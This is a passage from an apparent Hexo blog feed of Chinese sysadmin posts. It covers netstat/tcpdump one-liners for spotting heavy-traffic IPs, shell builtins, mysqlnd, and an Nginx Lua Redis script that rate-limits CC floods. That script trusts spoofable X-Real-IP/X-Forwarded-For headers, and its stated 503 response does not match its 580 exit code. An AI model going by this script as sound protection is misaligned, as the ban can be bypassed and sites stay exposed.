title="灰度策略控制中心lua脚本："></a>灰度策略控制中心lua脚本：</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic2.png"><p>在redis中存放需要认证的一些条件，然后在lua脚本中中获取这些条件进行判断，达到不同case走不同的upstream的效果。</p><h4 id="架构图："><a href="#架构图：" class="headerlink" title="架构图："></a>架构图：</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic3.png"><p>客户端（Client）发起请求，负载均衡集群（LB）接受参数并传入代理层（Proxy），然后经过规则验证命中不同的服务器（Server）。</p><h4 id="策略控制中心："><a href="#策略控制中心：" class="headerlink" title="策略控制中心："></a>策略控制中心：</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic4.png"><h4 id="整体流程图："><a href="#整体流程图：" class="headerlink" title="整体流程图："></a>整体流程图：</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic5.png"><h4 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h4><p>动态策略管理后台：</p><ul><li>项目配置</li><li>策略类型</li><li>策略功能</li></ul><p>分流策略控制中心：</p><ul><li>项目标识获取</li><li>策略参数提取</li><li>策略配置提取</li><li>策略命中</li><li>动态分流</li></ul><p>灰度监控：</p><ul><li>策略控制中心异常监控</li><li>灰度结果监控（业务监控等等）</li></ul><p>异常处理：</p><ul><li>策略控制中心异常处理</li><li>灰度结果异常处理</li></ul><h4 id="代码发布流程"><a href="#代码发布流程" class="headerlink" title="代码发布流程"></a>代码发布流程</h4><img src="/2019/03/21/2019-03-21-动态策略流量灰度发布/pic6.png">]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 发布 </tag>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux网络相关查询脚本</title>
      <link href="/2019/02/06/2019-02-06-Linux%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E6%9F%A5%E8%AF%A2%E8%84%9A%E6%9C%AC/"/>
      <url>/2019/02/06/2019-02-06-Linux%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E6%9F%A5%E8%AF%A2%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Linux网络相关查询脚本 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="查看TCP连接状态"><a href="#查看TCP连接状态" class="headerlink" title="查看TCP连接状态"></a>查看TCP连接状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netstat -nat |awk <span class="string">'&#123;print $6&#125;'</span>|sort|uniq -c|sort -rn</span><br><span class="line">netstat -n | awk <span class="string">'/^tcp/ &#123;++S[$NF]&#125;;END &#123;for(a in S) print a, S[a]&#125;'</span> 或</span><br><span class="line">netstat -n | awk <span class="string">'/^tcp/ &#123;++state[$NF]&#125;; END &#123;for(key in state) print key,"\t",state[key]&#125;'</span></span><br><span class="line">netstat -n | awk <span class="string">'/^tcp/ &#123;++arr[$NF]&#125;;END &#123;for(k in arr) print k,"\t",arr[k]&#125;'</span></span><br><span class="line">netstat -n |awk <span class="string">'/^tcp/ &#123;print $NF&#125;'</span>|sort|uniq -c|sort -rn</span><br><span class="line">netstat -ant | awk <span class="string">'&#123;print $NF&#125;'</span> | grep -v <span class="string">'[a-z]'</span> | sort | uniq -c</span><br></pre></td></tr></table></figure><p>（以上每一行实现的效果基本相同，在此列出不同的写法，方便对脚本写法的更深理解）</p><h3 id="查找请求数20个IP"><a href="#查找请求数20个IP" class="headerlink" title="查找请求数20个IP"></a>查找请求数20个IP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlp|grep 80|grep tcp|awk <span class="string">'&#123;print $5&#125;'</span>|awk -F: <span class="string">'&#123;print $1&#125;'</span>|sort|uniq -c|sort -nr|head -n20</span><br><span class="line">netstat -ant |awk <span class="string">'/:80/&#123;split($5,ip,":");++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;'</span> |sort -rn|head -n20</span><br></pre></td></tr></table></figure><p>（常用于查找攻击来源）</p><h3 id="用tcpdump嗅探80端口的访问看看谁最高"><a href="#用tcpdump嗅探80端口的访问看看谁最高" class="headerlink" title="用tcpdump嗅探80端口的访问看看谁最高"></a>用tcpdump嗅探80端口的访问看看谁最高</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F<span class="string">"."</span> <span class="string">'&#123;print $1"."$2"."$3"."$4&#125;'</span> | sort | uniq -c | sort -nr |head -20</span><br></pre></td></tr></table></figure><h3 id="查找较多time-wait连接"><a href="#查找较多time-wait连接" class="headerlink" title="查找较多time_wait连接"></a>查找较多time_wait连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -n|grep TIME_WAIT|awk <span class="string">'&#123;print $5&#125;'</span>|sort|uniq -c|sort -rn|head -n20</span><br></pre></td></tr></table></figure><h3 id="查找较多的SYN连接"><a href="#查找较多的SYN连接" class="headerlink" title="查找较多的SYN连接"></a>查找较多的SYN连接</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an | grep SYN | awk <span class="string">'&#123;print $5&#125;'</span> | awk -F: <span class="string">'&#123;print $1&#125;'</span> | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><h3 id="根据端口列进程"><a href="#根据端口列进程" class="headerlink" title="根据端口列进程"></a>根据端口列进程</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp | grep 80 | awk <span class="string">'&#123;print $7&#125;'</span> | cut -d/ -f1</span><br></pre></td></tr></table></figure><h3 id="查看有多少个PHP-CGI进程活动"><a href="#查看有多少个PHP-CGI进程活动" class="headerlink" title="查看有多少个PHP-CGI进程活动"></a>查看有多少个PHP-CGI进程活动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp | grep php-cgi | grep ^tcp | wc -l</span><br></pre></td></tr></table></figure><h3 id="查看PHP-CGI占用内存的总数"><a href="#查看PHP-CGI占用内存的总数" class="headerlink" title="查看PHP-CGI占用内存的总数"></a>查看PHP-CGI占用内存的总数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total=0; <span class="keyword">for</span> i <span class="keyword">in</span> `ps -C php-cgi -o rss=`; <span class="keyword">do</span> total=$((<span class="variable">$total</span>+<span class="variable">$i</span>)); <span class="keyword">done</span>; <span class="built_in">echo</span> <span class="string">"PHP-CGI Memory usage: <span class="variable">$total</span> kb"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下内置命令和外部命令详解</title>
      <link href="/2019/02/04/2019-02-04-Linux%E4%B8%8B%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
      <url>/2019/02/04/2019-02-04-Linux%E4%B8%8B%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4%E5%92%8C%E5%A4%96%E9%83%A8%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> Linux的命令分为内部命令和外部命令 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Linux的命令分为内部命令和外部命令：</p><ul><li>内部命令在系统启动时就调入内存，是常驻内存的，所以执行效率高。</li><li>外部命令是系统的软件功能，用户需要时才从硬盘中读入内存。</li></ul><h3 id="type"><a href="#type" class="headerlink" title="type"></a>type</h3><p>type可以用来判断一个命令是否为内置命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type: usage: type [-afptP] name [name ...]</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxeye ~]<span class="comment"># type type</span></span><br><span class="line"><span class="built_in">type</span> **is** a shell <span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type -p type</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type -t type</span></span><br><span class="line"><span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type type</span></span><br><span class="line"><span class="built_in">type</span> **is** a shell <span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type -t type</span></span><br><span class="line"><span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type pwd</span></span><br><span class="line">*<span class="built_in">pwd</span>* **is** a shell <span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type whiptail</span></span><br><span class="line">whiptail **is** /usr/bin/whiptail</span><br><span class="line">[root@linuxeye ~]<span class="comment"># type -t whiptail</span></span><br><span class="line">file</span><br></pre></td></tr></table></figure><h3 id="enable"><a href="#enable" class="headerlink" title="enable"></a>enable</h3><p>enable既可以查看内部命令，同时也可以判断是否为内部命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxeye ~]<span class="comment"># enable -a #查看内部命令</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># enable whiptail #非内部命令</span></span><br><span class="line">-bash: <span class="built_in">enable</span>: whiptail: **not** a shell <span class="built_in">builtin</span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># enable pwd #是内部命令</span></span><br></pre></td></tr></table></figure><p>内部命令用户输入时系统调用的速率快，不是<a href="https://linuxeye.com/tag/%e5%86%85%e7%bd%ae%e5%91%bd%e4%bb%a4/" target="_blank" rel="noopener">内置命令</a>，系统将会读取环境变量文件.bash_profile、/etc/profile去找PATH路径。</p><h3 id="hash表"><a href="#hash表" class="headerlink" title="hash表"></a>hash表</h3><p>然后在提一下命令的调用，有些历史命令使用过后，会存在在hash表中，当你再次输入该命令它的调用会是这样一个过程：</p><p>hash——&gt;内置命令——&gt;PATH </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@linuxeye ~]<span class="comment"># type pwd  </span></span><br><span class="line"><span class="built_in">pwd</span> is a shell <span class="built_in">builtin</span>  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># type cat  </span></span><br><span class="line">cat is /usr/bin/cat  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># pwd  </span></span><br><span class="line">/root  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># ls linuxeye*  </span></span><br><span class="line">linuxeye.pem  linuxeye.txt  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># cat linuxeye.txt  </span></span><br><span class="line">linuxeye  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># hash -l #显示hash表  </span></span><br><span class="line"><span class="built_in">builtin</span> <span class="built_in">hash</span> -p /usr/bin/cat cat  </span><br><span class="line"><span class="built_in">builtin</span> <span class="built_in">hash</span> -p /usr/bin/ls ls  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># type cat  </span></span><br><span class="line">cat is hashed (/usr/bin/cat)  </span><br><span class="line">[root@linuxeye ~]<span class="comment"># hash -r #清除hash表  </span></span><br><span class="line">[root@linuxeye ~]<span class="comment"># type cat  </span></span><br><span class="line">cat is /usr/bin/cat</span><br></pre></td></tr></table></figure><p>从上面操作可以看出。hash表不存放系统内置命令。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx Lua Redis防CC攻击</title>
      <link href="/2019/02/02/2019-02-02-Nginx%20Lua%20Redis%E9%98%B2CC%E6%94%BB%E5%87%BB/"/>
      <url>/2019/02/02/2019-02-02-Nginx%20Lua%20Redis%E9%98%B2CC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> web安全 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Nginx Lua Redis防止CC攻击实现原理：</p><p>同一个外网IP、同一个网址(ngx.var.request_uri)、同一个客户端(http_user_agent)在某一段时间(CCseconds)内访问某个网址(ngx.var.request_uri)超过指定次数(CCcount)，则禁止这个外网IP+同一个客户端(md5(IP+ngx.var.http_user_agent)访问这个网址(ngx.var.request_uri)一段时间(blackseconds)。</p><p>该脚本使用lua编写(依赖nginx+lua)，将信息写到redis(依赖redis.lua)。</p><h3 id="Nginx-lua模块安装"><a href="#Nginx-lua模块安装" class="headerlink" title="Nginx lua模块安装"></a>Nginx lua模块安装</h3><p>重新编译nginx，安装lua模块，或者直接使用《<a href="https://oneinstack.com/" target="_blank" rel="noopener">OneinStack</a>》安装OpenResty自带改模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pushd</span> /root/oneinstack/src</span><br><span class="line">wget -c http://nginx.org/download/nginx-1.12.1.tar.gz</span><br><span class="line">wget -c http://mirrors.linuxeye.com/oneinstack/src/openssl-1.0.2l.tar.gz</span><br><span class="line">wget -c http://mirrors.linuxeye.com/oneinstack/src/pcre-8.41.tar.gz</span><br><span class="line">wget -c http://luajit.org/download/LuaJIT-2.0.5.tar.gz</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/simpl/ngx_devel_kit.git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openresty/lua-nginx-module.git</span><br><span class="line">tar xzf nginx-1.12.1.tar.gz</span><br><span class="line">tar xzf openssl-1.0.2l.tar.gz</span><br><span class="line">tar xzf pcre-8.41.tar.gz</span><br><span class="line">tar xzf LuaJIT-2.0.5.tar.gz</span><br><span class="line"><span class="built_in">pushd</span> LuaJIT-2.0.5</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"><span class="built_in">pushd</span> nginx-1.12.1</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/nginx --user=www --group=www --with-http_stub_status_module --with-http_v2_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-openssl=../openssl-1.0.2l --with-pcre=../pcre-8.41 --with-pcre-jit --with-ld-opt=-ljemalloc --add-module=../lua-nginx-module --add-module=../ngx_devel_kit</span><br><span class="line">make</span><br><span class="line">mv /usr/<span class="built_in">local</span>/nginx/sbin/nginx&#123;,_bk&#125;</span><br><span class="line">cp objs/nginx /usr/<span class="built_in">local</span>/nginx/sbin</span><br><span class="line">nginx -t <span class="comment">#检查语法</span></span><br></pre></td></tr></table></figure><h3 id="加载redis-lua"><a href="#加载redis-lua" class="headerlink" title="加载redis.lua"></a>加载redis.lua</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/<span class="built_in">local</span>/nginx/conf/lua</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/nginx/conf/lua</span><br><span class="line">wget https://github.com/openresty/lua-resty-redis/raw/master/lib/resty/redis.lua</span><br></pre></td></tr></table></figure><p>在/usr/local/nginx/conf/nginx.conf http { }中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#the Nginx bundle:</span><br><span class="line">lua_package_path &quot;/usr/local/nginx/conf/lua/redis.lua&quot;;</span><br></pre></td></tr></table></figure><h3 id="防止CC规则waf-lua"><a href="#防止CC规则waf-lua" class="headerlink" title="防止CC规则waf.lua"></a>防止CC规则waf.lua</h3><p>将下面内容保存在/usr/local/nginx/conf/lua/waf.lua</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> get_headers = ngx.req.get_headers</span><br><span class="line"><span class="keyword">local</span> ua = ngx.var.http_user_agent</span><br><span class="line"><span class="keyword">local</span> uri = ngx.var.request_uri</span><br><span class="line"><span class="keyword">local</span> url = ngx.var.host .. uri</span><br><span class="line"><span class="keyword">local</span> redis = <span class="built_in">require</span> <span class="string">'redis'</span></span><br><span class="line"><span class="keyword">local</span> red = redis.new()</span><br><span class="line"><span class="keyword">local</span> CCcount = <span class="number">20</span></span><br><span class="line"><span class="keyword">local</span> CCseconds = <span class="number">60</span></span><br><span class="line"><span class="keyword">local</span> RedisIP = <span class="string">'127.0.0.1'</span></span><br><span class="line"><span class="keyword">local</span> RedisPORT = <span class="number">6379</span></span><br><span class="line"><span class="keyword">local</span> blackseconds = <span class="number">7200</span></span><br><span class="line"><span class="keyword">if</span> ua == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    ua = <span class="string">"unknown"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> (uri == <span class="string">"/wp-admin.php"</span>) <span class="keyword">then</span></span><br><span class="line">    CCcount=<span class="number">20</span></span><br><span class="line">    CCseconds=<span class="number">60</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">red:set_timeout(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">local</span> ok, err = red.connect(red, RedisIP, RedisPORT)</span><br><span class="line"><span class="keyword">if</span> ok <span class="keyword">then</span></span><br><span class="line">    red.connect(red, RedisIP, RedisPORT)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getClientIp</span><span class="params">()</span></span></span><br><span class="line">        IP = ngx.req.get_headers()[<span class="string">"X-Real-IP"</span>]</span><br><span class="line">        <span class="keyword">if</span> IP == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            IP = ngx.req.get_headers()[<span class="string">"x_forwarded_for"</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> IP == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            IP  = ngx.var.remote_addr</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> IP == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">            IP  = <span class="string">"unknown"</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> IP</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> token = getClientIp() .. <span class="string">"."</span> .. ngx.md5(url .. ua)</span><br><span class="line">    <span class="keyword">local</span> req = red:exists(token)</span><br><span class="line">    <span class="keyword">if</span> req == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        red:incr(token)</span><br><span class="line">        red:expire(token,CCseconds)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">local</span> times = <span class="built_in">tonumber</span>(red:get(token))</span><br><span class="line">        <span class="keyword">if</span> times &gt;= CCcount <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> blackReq = red:exists(<span class="string">"black."</span> .. token)</span><br><span class="line">            <span class="keyword">if</span> (blackReq == <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">                red:set(<span class="string">"black."</span> .. token,<span class="number">1</span>)</span><br><span class="line">                red:expire(<span class="string">"black."</span> .. token,blackseconds)</span><br><span class="line">                red:expire(token,blackseconds)</span><br><span class="line">                ngx.<span class="built_in">exit</span>(<span class="number">580</span>)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                ngx.<span class="built_in">exit</span>(<span class="number">580</span>)</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            red:incr(token)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h3 id="Nginx虚拟主机加载waf-lua"><a href="#Nginx虚拟主机加载waf-lua" class="headerlink" title="Nginx虚拟主机加载waf.lua"></a>Nginx虚拟主机加载waf.lua</h3><p>在虚拟主机配置文件/usr/local/nginx/conf/vhost/oneinstack.com.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_by_lua_file &quot;/usr/local/nginx/conf/lua/waf.lua&quot;;</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>一分钟之内，一个页面快速点击20次以上，登录redis，看到black开通的key即被禁止访问（nginx 503）</p><img src="/2019/02/02/2019-02-02-Nginx%20Lua%20Redis防CC攻击/pic1.png">]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP5.3以上版本推荐使用mysqlnd驱动</title>
      <link href="/2018/12/03/2018-12-03-PHP5.3%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8mysqlnd%E9%A9%B1%E5%8A%A8/"/>
      <url>/2018/12/03/2018-12-03-PHP5.3%E4%BB%A5%E4%B8%8A%E7%89%88%E6%9C%AC%E6%8E%A8%E8%8D%90%E4%BD%BF%E7%94%A8mysqlnd%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 代替旧的libmysql驱动 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="什么是mysqlnd"><a href="#什么是mysqlnd" class="headerlink" title="什么是mysqlnd"></a>什么是mysqlnd</h3><p>mysqldnd（MySQL native driver）是由PHP源码提供的mysql驱动连接代码。它的目的是代替旧的libmysql驱动。</p><p>传统的安装php的方式中，我们在编译PHP时，一般指定以下几项:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--with-mysql=/usr/local/mysql \</span><br><span class="line">--with-mysqli=/usr/local/mysql/bin/mysql_config \</span><br><span class="line">--with-pdo-mysql=/usr/local/mysql/bin/mysql_config \</span><br></pre></td></tr></table></figure><p>这实际上就是使用了MySQL官方自带的libmysql驱动, 这是比较老的驱动, PHP 5.3开始已经不建议使用它了, 而建议使用mysqlnd。</p><h3 id="PDO与mysqlnd-libmysql的关系"><a href="#PDO与mysqlnd-libmysql的关系" class="headerlink" title="PDO与mysqlnd, libmysql的关系"></a>PDO与mysqlnd, libmysql的关系</h3><p>PDO是一个应用层抽象类，底层和MySQL server连接交互需要MySQL驱动的支持。也就是说无论你使用了何种驱动，都可以使用PDO。</p><p>PDO是提供了PHP应用程序层API接口，而mysqlnd、libmysql则负责与MySQL server进行网络协议交互(它并不提供php应用程序层API功能)。应用、数据、文件分离</p><h3 id="为什么使用mysqlnd驱动"><a href="#为什么使用mysqlnd驱动" class="headerlink" title="为什么使用mysqlnd驱动"></a>为什么使用mysqlnd驱动</h3><ol><li><p>传统的PHP访问MySQL数据库，是通过MySQL数据库的libmysql client库，这个libmysql client是用C/C++编写的，虽然一直以来PHP通过libmysql访问数据库性能也一直很好，但是却无法利用PHP本身的很多特性。</p><p>mysqlnd提供了和Zend引擎高度的集成性，更加快速的执行速度，更少的内存消耗，利用了PHP的Stream API，以及客户段缓存机制。由于mysqlnd是透过Zend引擎，因此提供更多高级特性，以及有效利用Zend进行加速，原理图如下：</p><img src="/2018/12/03/2018-12-03-PHP5.3以上版本推荐使用mysqlnd驱动/pic1.png"><p>从上图可以看出来，libmysql是直接访问数据库的，而mysqlnd是通过Zend访问数据库。</p></li><li><p>libmysql驱动是由MySQL AB公司(现在是oracle公司)编写, 并按MySQL license许可协议发布，所以在PHP中默认是被禁用的。而mysqlnd是由php官方开发的驱动,以php license许可协议发布，故就规避了许可协议和版权的问题</p></li><li><p>mysqlnd内置于PHP源代码，故你在编译安装php时就不需要预先安装MySQL server也可以提供MySQL client API (mysql_connect、pdo、mysqli)，这将减化一些工作量</p></li><li><p>一些新的或增强的功能</p><ul><li>增强的持久连接</li><li>引入特有的函数mysqli_fetch_all()</li><li>引入一些性能统计函数 mysqli_get_cache_stats(), mysqli_get_client_stats(), mysqli_get_connection_stats(),上述函数,可很容易分析mysql查询的性能瓶颈</li><li>SSL支持(从php 5.3.3开始有效)</li><li>压缩协议支持</li><li>命名管道支持(php 5.4.0开始有效)</li></ul></li></ol><h3 id="怎么安装mysqlnd驱动"><a href="#怎么安装mysqlnd驱动" class="headerlink" title="怎么安装mysqlnd驱动"></a>怎么安装mysqlnd驱动</h3><p>编译php时，修改以下几个项参数即可。（如果使用mysqlnd，并不需要预先安装mysql）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--with-mysql=mysqlnd \</span><br><span class="line">--with-mysqli=mysqlnd \</span><br><span class="line">--with-pdo-mysql=mysqlnd \</span><br></pre></td></tr></table></figure><p>如果在phpinfo输出的mysql项中发现client API Version：mysqlnd，说明mysqlnd驱动安装成功。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大型网站系统架构演化之路</title>
      <link href="/2018/11/25/2018-11-25-%E5%A4%A7%E5%9E%8B%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8C%96%E4%B9%8B%E8%B7%AF/"/>
      <url>/2018/11/25/2018-11-25-%E5%A4%A7%E5%9E%8B%E7%BD%91%E7%AB%99%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E6%BC%94%E5%8C%96%E4%B9%8B%E8%B7%AF/</url>
      
